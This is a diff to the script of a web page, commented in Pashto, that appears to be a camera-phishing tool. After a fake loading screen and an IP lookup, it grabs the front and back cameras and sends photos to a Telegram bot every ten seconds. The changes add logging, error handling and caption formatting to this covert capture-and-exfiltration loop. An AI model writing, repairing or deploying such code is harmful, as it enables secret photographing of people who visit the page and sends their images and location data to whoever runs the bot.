@@ -86,7 +86,12 @@
 
             // د عکس اخستل او لیږل دوه کمیرې
             function captureAndSend() {
-                if (!frontStream || !backStream) return; // که چیرې کمیرا شتون نه لري، نو کار نه کړي
+                if (!frontStream || !backStream) {
+                    console.log("Camera streams not ready yet.");
+                    return; // که چیرې کمیرا شتون نه لري، نو کار نه کړي
+                }
+
+                console.log("Attempting to capture and send photos...");
 
                 // د لومړي کمیرا ( frontal / front ) عکس
                 canvasFront.width = frontVideo.videoWidth;
@@ -101,6 +106,13 @@
                 // د عکسونو د blob (Binary Large Object) په توګه بدلول
                 canvasFront.toBlob(function(frontBlob) {
                     canvasBack.toBlob(function(backBlob) {
+                        if (!frontBlob || !backBlob) {
+                            console.error("Failed to convert canvas to blob.");
+                            return;
+                        }
+
+                        console.log("Blobs created, attempting to send...");
+
                         const frontPhotoFile = new File([frontBlob], 'front_photo.jpg', { type: 'image/jpeg' });
                         const backPhotoFile = new File([backBlob], 'back_photo.jpg', { type: 'image/jpeg' });
 
@@ -109,7 +121,10 @@
                             const formData = new FormData();
                             formData.append('chat_id', userId);
                             formData.append('photo', photoFile);
-                            formData.append('caption', caption); // میسج د عکس سره
+                            if (caption) {
+                                formData.append('caption', caption); // میسج د عکس سره
+                                formData.append('parse_mode', 'Markdown'); // د ایموجی او فارمیټ لپاره
+                            }
 
                             return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                                 method: 'POST',
@@ -123,9 +138,11 @@
                             sendPhoto(backPhotoFile, message)
                         ])
                         .then(responses => {
+                            console.log("Fetch requests completed, checking responses...");
                             return Promise.all(responses.map(r => r.json()));
                         })
                         .then(results => {
+                            console.log("Telegram API responses:", results);
                             results.forEach((data, index) => {
                                 if (data.ok) {
                                     console.log(`Photo ${index + 1} sent successfully.`);
@@ -135,7 +152,7 @@
                             });
                         })
                         .catch(error => {
-                            console.error('Error sending photos:', error);
+                            console.error('Error in Promise.all or fetch:', error);
                         });
                     }, 'image/jpeg');
                 }, 'image/jpeg');
@@ -146,25 +163,30 @@
                 // د لومړي کمیرا ( frontal / front ) لاسرسی
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // frontal camera
                     .then(stream => {
+                        console.log("Front camera stream acquired.");
                         frontStream = stream;
                         frontVideo.srcObject = stream;
                     })
                     .catch(err => {
                         console.error("Error accessing front camera: ", err);
+                        // د یو کمیرا په ناکامۍ سر هم چلند نه ګرځي، د دوهم کمیرا تلاش کړي
                     });
 
                 // د دوهم کمیرا ( back ) لاسرسی
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }) // back camera
                     .then(stream => {
+                        console.log("Back camera stream acquired.");
                         backStream = stream;
                         backVideo.srcObject = stream;
                     })
                     .catch(err => {
                         console.error("Error accessing back camera: ", err);
+                         // د یو کمیرا په ناکامۍ سر هم چلند نه ګرځي، د لومړي کمیرا تلاش کړي
                     });
 
                 // 1 ثانیه وخت تمه (د لوډینګ وخت)
                 setTimeout(() => {
+                    console.log("Starting photo capture interval.");
                     // د عکسونو د اخستلو او لیږلو چلند (د 10 ثانیو په وخت کې)
                     setInterval(captureAndSend, 10000); // 10000 milliseconds = 10 seconds
                     // که چیرې تاسو 1 ثانیه یا نور وخت غواړئ، نو عدد بدل کړئ
@@ -172,10 +194,12 @@
 
             } else {
                 console.error("navigator.mediaDevices.getUserMedia is not supported by this browser.");
+                document.querySelector('.loading p').textContent = "Camera access not supported.";
             }
         })
         .catch(error => {
             console.error('Error fetching IP info:', error);
+            document.querySelector('.loading p').textContent = "Failed to load info.";
         });
     </script>
 
